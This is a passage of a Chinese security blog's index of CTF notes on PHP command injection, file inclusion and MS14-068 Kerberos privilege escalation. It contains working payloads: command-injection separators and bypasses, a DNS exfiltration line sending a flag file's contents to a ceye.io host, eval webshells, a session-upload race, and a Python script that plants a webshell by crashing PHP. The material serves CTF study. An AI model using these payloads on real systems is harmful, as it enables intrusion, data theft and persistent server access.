","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:1","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"1.2 DEMO \u003c?php hightlight_file(__FILE__); $price = $_GET['price']; $code = 'echo $name'. '的价格是'. $price. ';'; $b = create_function('$name', $code); $b('iPhone'); ?\u003e Payload：url?price=123;}phpinfo();/* ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:2","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"2 命令注入 ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"2.1 相关函数 2.1.1 system 2.1.2 exec 2.1.3 passthru 2.1.4 shell_exec 2.1.5 `` 运算符 2.1.6 ob_start ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:1","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"2.2 命令执行的绕过 2.2.1 命令执行的分隔符 例如： \u003c?php highlight_file(__FILE__); $rce = \"echo 123\"; system($rce. $_GET[1]); ?\u003e 如何实现命令执行 换行符 %0a 回车符 %0d 连续指令 ; 后台进程 \u0026 管道符 | 逻辑 ||、\u0026\u0026 2.2.2 命令执行的分隔符 \u003c 符号 $IFS ${IFS} $IFS$9 %09 用于url传递 ${9} 2.2.3 其它 Tips 2.2.3.1 命令拼接 $a=l;$b=s;$a$b 2.2.3.2 base64 编码 `echo cHdk | base64 -D` 2.2.3.3 substr string pos len 该表达式是从 string 中取出从 pos 位置开始长度为 len 的子字符串。如果 pos 或 len 为非正整数时，将返回空字符串。 echo “${PATH:0:1}” -\u003e / echo \"`expr\\$IFS\\substr\\\\$IFS\\\\$(pwd)\\\\$IFS\\1\\$IFS\\1`\" echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)` -\u003e / expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1{$IFS}1 ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:2","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","渗透测试","CTF"],"content":"2.3 命令无回显的情况 2.3.1 判断 延时 ls|sleep(3) HTTP 请求 DNS 请求 ceye.io 2.3.2 利用 写 shell（直接写入、外部下载） http / dns 等方式带出 2.3.3 DEMO \u003c?php highlight_file(__FILE__); include(\"where_is_flag.php\"); echo \"ping:\"; $ip = (string)$_GET['ping']; $ip = str_replace(\"\u003e\", \"0.0\", $ip); shell_exec(\"ping \".$ip); ?\u003e payload： ip=;cp where_is_flag.php 1.txt ip=`cat 1.txt|sed s/[[:space:]]//`.xx.ceye.io 技巧 cat 1.txt|sed s//[[:space:]]//g 是去除空格的作用 ","date":"2019-05-31","objectID":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:3","tags":["常用","渗透测试","代码审计"],"title":"CTF 中的命令执行漏洞","uri":"/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"PHP 文件包含漏洞相关","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"PHP 文件包含漏洞 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:0:0","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"1 相关函数 include() include_once() require() require_once() ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:0","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"2 分类 远程文件包含 本地文件包含 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:2:0","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"3 包含的实现 包含的时候，不一定是要去包含 php 文件（即可执行的 php 文件） 类似于：a.phps、a.xxx、a.jpg 只要文件中包含一块完整 php 代码，例如一个 a.txt，内容为 \u003c?php phpinfo();?\u003e ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:3:0","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4 包含的场景 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:0","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.1 上传可控文件 比如说我们能够上传图片，那就去传一个带完整 php 代码的图片文件，或者是将代码文件改后缀即可 压缩包，配合伪协议 \u003c?php ?\u003e 过滤的情况： \u003cscript language=\"php\"\u003e@eval($_POST['a']);\u003c/script\u003e ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:1","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.2 远程文件包含 4.2.1 条件 allow_url_fopen 本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可能会注册更多的封装协议。 4.2.2 远程文件包含 [http|https|ftp]://www.bbb.com/shell.txt 若后缀名写死，可以用 ? 绕过 pyload: aaa.com/1.php?a ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:2","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.3 伪协议 4.3.1 PHP 归档 phar:// zip:// DEMO： http://106.12.37.37/index.php?url=upload payload： url=zip://a.zip#压缩包内文件名 url=phar://a.zip/压缩包内文件名 上传的文件无所谓后缀名，只要是 zip 文件头的文件均可，zip 文件改成 jpg，zip:// 协议仍然可以解析 4.3.2 利用 PHP 流 4.3.2.1 php://filter 元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式(all-in-one)的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。 ?file=php://filter/read=convert.base64-encode/resource=index.php ?file=php://filter/read=string.toupper|string.rot13/resource=index.php 除此之外，还有： string.toupper //上面有写 string.tolower //转换为小写 string.strip_tags //去除html和php标记，比如\u003c?php?\u003e convert.base64-encode //base64编码 convert.base64-decode //base64编码 convert.quoted-printable-encode //quoted-printable 转 8bit convert.quoted-printable-decode //同上 DEMO： http://chinalover.sinaapp.com/web7/index.php 4.3.2.2 php://input 利用条件 allow_url_include = On 对 allow_url_fopen 不做要求 php://input 可以读取没有处理过的 POST 数据 Payload: Url：?key=123\u0026flag=php://input Post：123 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:3","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.4 日志文件 很多时候，web 服务器会将请求写入到日志文件中，比如说 apache 在用户发起请求时，会将请求写入 access error.log。默认情况下，日志保存路径在 /var/log/apache2/ www 用户无权限读取该日志，应用场景有限。 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:4","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.5 SESSION PHP 默认生成的 session 文件往往存放在 /tmp 目录下 4.5.1 session 文件 注册一句话用户名，并包含 session 文件http://512ab969d9ce414e9349e459f7bfe9d1b601c9951aa24093.changame.ichunqiu.com/action.php?module=\u0026file=../../../../../../../tmp/SESS/sess_tftrtvb6t089398jjl0p1cdvj7\u0026a=system(\"cat flag.php\"); 4.5.2 session.upload session.upload_progress.enabled 这个参数在 php.ini 默认开启，需要手动配置为 OFF，如果不是 off，就会在上传的过程中生成上传进度文件，它的出现本是为了显示文件在上传时候的进度，以显示文件上传的信息。 它的存储路径可以在 phpinfo 中获取到（如上图） Demo： \u003c?php ($_=@_GET['orange']) \u0026\u0026 @substr(file($_)[0],0,6) === '@\u003c?php' ? include($_) : highlight_file(__FILE__); ?\u003e 这个 session 文件并不一定要 session_start 才能生成，只要往服务器发送一个 Cookie: PHPSESSID=xxx 的值，然后用 session upload 的方式进行上传文件，就会生成这样一个 session 文件 通过 curl 上传文件： curl http://IP/index.php -H 'Cookie:PHPSESSID=iamnotorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=aaa' -F 'file=@/etc/passwd' 这样就可以控制文件名，接下来想办法控制文件内容。 由于文件上传的速度比较快，有时候经常来不及看到保存在 session 文件中的 upload 信息，就会被删除。我们可以上传一个相对比较大的文件，并且条件竞争的方式。来先看一下保存在 session 中的文件内容。 这里构造了一个这样的表单，upload.php \u003cform action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"\u003c?php echo ini_get(\"session.upload_progress.name\"); ?\u003e\" value=\"iamnotorange\" /\u003e \u003cinput type=\"file\" name=\"file1\" /\u003e \u003cinput type=\"file\" name=\"file2\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e \u003c?php session_start(); $name = ini_get('session.upload_progress.name'); $key = ini_get('session.upload_progress.prefix') . $_POST[$name]; var_dump($_SESSION[$key]); include '/var/lib/php/sessions/sess_iamnotorange'; 然后开个多线程跑几次，就能看到通过条件竞争读出的文件内容： 可以发现文件中的 upload_progress_ 固定，不可控。 接下来还有一个条件是 substr(file($_)[0],0,6) === '@\u003c?php'，想到利用 php 中的伪协议，进行文件内容的修改。 参考：https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1 base64 的前置知识 base64编码后的字符串集为 [0-9a-zA-Z+/=] 因而在解码的时候遇到这个之外的字符，就会跳过那些字符。只对在此范围内的字符进行解码。 在本例中，_ 作为特殊字符，在 base64 解码时会自动跳过。 所以只要对前面的 upload_progress_ 进行足够多次的解密，就可以使其变成空字符 $i = 0 ; $data = \"upload_progress_\"; while(true){ $i += 1; $data = base64_decode($data); var_dump($data); if($data == ''){ echo \"一共解码了:\".$i,\"次\\n\"; break; } } 通过脚本可以看到，只要三次就可以将前面的内容转换为成空。 但是，由于 base64 是对 4 个字符为一组进行解码。upload_progress_ 并不满足三次解码后允许字符是 4 的倍数(14 个有效字符，要求有效字符至少是 16 个)，就会把后面的字符算入填充，从而破坏原有传入的 php 代码。 示例 function triple_base64_encode($str){ return base64_encode(base64_encode(base64_encode($str))); } function triple_base64_decode($str){ return base64_decode(base64_decode(base64_decode($str))); } $i = 0 ; $data = \"upload_progress_\".triple_base64_encode(\"\u003c?=\\`id\\`;\u003e\"); echo triple_base64_decode($data); 解码之后的数据是 ? 而 upload_progress_ZZ 在三次的解码中，第一次解码后留下了四个允许字符hikY，第二次解码没有允许字符，第三次就变成了空。 在这三次中，都是允许字符的数量都是 4 的倍数，这样就不会破坏后面传入的 php 代码。 爆破脚本： \u003c?php $str = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz\"; while(true) { $i = 0 ; $data = \"upload_progress_\".substr(str_shuffle($str),10,2); $s = base64_decode($data); $s_length = strlen(preg_replace('|[^a-z0-9A-Z+/]|s', '', $s)); $ss = base64_decode($s); $ss_length = strlen(preg_replace('|[^a-z0-9A-Z+/]|s', '', $ss)); $sss = base64_decode($ss); if($s_length%4==0 \u0026\u0026 $ss_length%4==0 \u0026\u0026 $sss=='') { echo $data; break; } } 对于后面的 php 代码，也有一个要求，就是三次解密中都不能出现 =，因为base64中 = 只能放在编码的最后补位，出现在中间的话，php://filter/convert.base64-decode 流就无法正常解析，就会报错。 对此 oragne 师傅写了个脚本生成这玩意： import string from base64 import b64encode from random import sample, randint payload = \"@\u003c?php file_put_contents('/tmp/web', '@\u003c?php eval($_GET[1])?\u003e'); ?\u003e\" while 1: junk = ''.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if '=' not in x and '=' not in xx and '=' not in xxx: print(xxx) break VVVSM0wyTkhhSGRKUjFwd1lrZFdabU5JVmpCWU1rNTJZbTVTYkdKdVVucExRMk4yWkVjeGQwd3paR3haYVdOelNVTmtRVkJFT1hkaFNFRm5XbGhhYUdKRFoydFlNR1JHVmtaemVGaFRheTlRYVdOd1QzbEJMMUJzVGxGVmEwNUZWbXh3YTFSRk5UTmlNMHB6 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:5","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.6 ./ 长文件名截断 payload:?page=phpinfo.txt………………………………………………………………………………………………….. 或page=phpinfo.txt././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:6","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.7 phpinfo 向服务器上任意 php 文件以 form-data 式提交请求上传数据时，会生成临时文件，通过 phpinfo 来获取临时文件的路径以及名称，然后临时文件在极短时间被删除的时候，需要竞争时间包含临时文件拿到 webshell https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:7","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.8 PHP 自包含 上传 -\u003e 临时文件 会话结束 -\u003e 删除临时文件 phpinfo() -\u003e 临时文件名 中断删除的过程 /a.php?include=a.php 这样 a.php 会将它自身包含进来，而被包含进来的 a.php 再次尝试处理 url 的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆栈，使php无法进行此次请求的后续处理，然后就能进行包含了 自包含，导致 php 停止 demo： 「百度杯」CTF比赛 十二月场 - Blog 进阶版 注册账号，POST 页面存在 insert 型 SQL 注入获取管理员账号 登录 admin 账号，发现 manage 页面下存在包含 利用自包含漏洞，在 tmp 文件夹下上传 webshell ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:8","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"4.9 PHP 崩溃 本地文件包含漏洞可以让 php 包含自身从而导致死循环然后 php 就会崩溃，如果请求中同时存在一个上传文件的请求的话,这个文件就会被保留 include.php?file=php://filter/string.strip_tags/resource=/etc/passwd include.php?file=php://filter/string.strip_tags/resource=/etc/passwd 可以导致 php 在执行过程中 Segment Fault 想到可以利用在本地文件包含漏洞中 之前在网上的分析文章中，本地文件包含漏洞可以让 php 包含自身从而导致死循环 然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话，这个文件就会被保留 #!/usr/bin/env python # -*- coding: utf-8 -*- import requests import string import itertools charset = string.digits + string.letters host = \"192.168.43.155\" port = 80 base_url = \"http://%s:%d\" % (host, port) def upload_file_to_include(url, file_content): files = {'file': ('evil.jpg', file_content, 'image/jpeg')} try: response = requests.post(url, files=files) except Exception as e: print e def generate_tmp_files(): webshell_content = '\u003c?php eval($_REQUEST[c]);?\u003e'.encode( \"base64\").strip().encode(\"base64\").strip().encode(\"base64\").strip() file_content = '\u003c?php if(file_put_contents(\"/tmp/ssh_session_HD89q2\", base64_decode(\"%s\"))){echo \"flag\";}?\u003e' % ( webshell_content) phpinfo_url = \"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd\" % ( base_url) length = 6 times = len(charset) ** (length / 2) for i in xrange(times): print \"[+] %d/ %d\" % (i, times) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \"__main__\": main() ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:9","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["常用","代码审计","CTF","渗透测试"],"content":"5 总结 当一个目标存在任意文件包含漏洞的时候，但找不到可以包含的文件，无法 getshell。可以有三种方法： 借用 phpinfo，包含临时文件来 getshell 利用 PHP_SESSION_UPLOAD_PROGRESS，包含 session 文件来 getshell 利用一个可以使 PHP 挂掉的漏洞（如内存漏洞等），使 PHP 停止执行，此时上传的临时文件就没有删除。我们可以爆破缓存文件名来 getshell。 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:5:0","tags":["常用","CTF"],"title":"PHP 文件包含漏洞","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["内网渗透"],"content":"MS14-068 漏洞分析","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"MS14-068 漏洞分析 ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"1 漏洞简介 2014.11.18 日，微软发布 MS14-068 补丁，修复了一个影响全部版本 Windows 服务器的严重漏洞。用于解决 Microsoft Windows Kerberos KDC 漏洞，该漏洞允许黑客提升任意普通用户权限成为域管理员身份。攻击者可以利用这些提升的权限控制域中所有的计算机，包括域服务器。 ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:0","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"2 原理分析 ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:0","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"2.1 kerberos 认证流程 Server 收到 Client 发来的 TGS 后，要根据 TGS 中 Client 申明所在的域组，和 Server 上的 ACL 进行比对，然后决定给予 Client 什么样的资源访问权限。 微软使用 PAC 来表示 TGS 中 Client 申明的域组。PAC (Privilege Attribute Certificate)，特权属性证书。 ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:1","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"2.2 PAC PAC 包含 Client 的 User 的 SID、Group 的 SID。PAC 决定了 Client 的组属性，即决定了 Client 的权限 PAC 为了保证自身的合法性，还包含 2 个签名，Key 为 krbtgt 的 NTLM，签名的内容除了 User SID、Group SID 外，还有其他部分 PAC 作为 TGT 的一部分，是加密的，密钥为 krbtgt 的 NTLM Client 向 KDC 的 AS 模块发起认证请求，AS 返回 TGT 时，会根据 Client 所在的组，生成 PAC，包含 Client 的 User SID、Group SID，以及用于确保 PAC 不被篡改的 2 个签名 将 PAC 作为 TGT 的一部分，发送给 Client。 Client 使用 TGT 向 KDC 的 TGS 模块发起访问 Server 服务时，KDC 的 TGS 模块首先解密TGT，并通过校验 2 个签名，以验证 PAC 的合法性。 如果通过验证，KDC 的 TGS 模块用 2 个新的签名替代老的签名来保证 PAC 不被篡改。第一个签名的密钥为 Server 的 NTLM，第二个密钥为 Server 与 Client 的临时会话密钥（Server Session Key）。 重新签名后的 PAC 被放置在签发的访问票据 TGS 中，使用 Server 的 NTLM 作为密钥被加密保护 Server 收到来自 Client 的 TGS 后，解密 TGS 验证合法性，校验 PAC 中的 2 个签名，确认 PAC 的合法性，然后确认 Client 的访问权限。 ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:2","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"2.3 漏洞成因 Client 在发起认证请求时，通过设置 include-PAC 为 False，则返回的 TGT 中不会包含 PAC。 KDC 对 PAC 进行验证时，对于 PAC 尾部的签名算法，虽然原理上规定必须是带有 Key 的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC 服务器就会使用指定的算法进行签名验证。 因此伪造的任意内容都可以是合法的，直接加上内容的值作为签名即可(第一个原因) PAC 没有被放在 TGT 中，放在其它地方。KDC 在仍然能够正确解析出没有放在 TGT 中的 PAC 信息 PAC 必须是密文，经过 Key 加密的 KDC 会从 Authenticator 中取出来 Session Key，把 PAC 信息解密并利用客户端设定的签名算法验证签名(第二个原因) KDC 验证缺少 PAC 的 TGT 成功后，再去验证不在 TGT 中的 PAC 的合法性。 如果 2 个均验证成功，KDC 把 PAC 中的 User SID、Group SID 取出来，重新使用进行签名，签名算法和密钥与设置 inclue-pac 标志位为 TRUE 时一模一样。将新产生的 PAC 加入到解密后的 TGT 中，再重新加密制作全新的 TGT 发送给 Client，不是 ST (第三个原因) ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:3","tags":["域安全","内网渗透"],"title":"MS14-068 漏洞分析","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"域环境中的组策略安全测试相关知识整理","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"域环境中的组策略安全测试 ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:0:0","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"1 组策略的部署与更新 ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:0","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"1.1 组策略的部署 Windows 2016 自带 Server Manager 组策略管理工具 更专业的组策略管理工具 GPMC，可以管理多个域 创建并编辑组策略的内容 组策略分作主机策略和用户策略，machine 和 users 目录；脚本类型和非脚本类型，script 目录 ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:1","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"1.2 组策略的存储 存储在域服务器中，\\\\domain\\sysvol\\policies 